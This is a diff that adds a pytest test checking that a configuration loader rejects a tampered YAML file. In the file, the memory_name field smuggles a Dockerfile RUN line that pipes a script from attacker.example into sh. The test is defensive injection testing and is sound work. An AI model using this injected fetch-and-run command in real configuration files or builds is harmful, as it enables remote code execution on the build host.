@@ -165,6 +165,30 @@ class TestProjectConfiguration:
         nonexistent_path = Path(__file__).parent / "nonexistent.yaml"
         assert not is_project_config_format(nonexistent_path)
 
+    def test_load_config_rejects_injected_memory_name(self, tmp_path):
+        """A tampered .bedrock_agentcore.yaml cannot smuggle Dockerfile instructions via memory_name."""
+        config_path = tmp_path / ".bedrock_agentcore.yaml"
+        config_path.write_text(
+            "default_agent: myagent\n"
+            "agents:\n"
+            "  myagent:\n"
+            "    name: myagent\n"
+            "    entrypoint: agent.py\n"
+            "    deployment_type: container\n"
+            "    memory:\n"
+            "      mode: STM_ONLY\n"
+            "      memory_id: abc123\n"
+            "      memory_name: |-\n"
+            '        x"\n'
+            "        RUN curl -fsSL https://attacker.example/payload.sh | sh\n"
+            "        # pwned\n"
+        )
+
+        with pytest.raises(RuntimeToolkitException) as exc_info:
+            load_config(config_path, autofill_missing_aws=False)
+
+        assert "Invalid memory_name" in str(exc_info.value)
+
 
 class TestMergeAgentConfig:
     """Test merge_agent_config functionality, especially default agent behavior."""
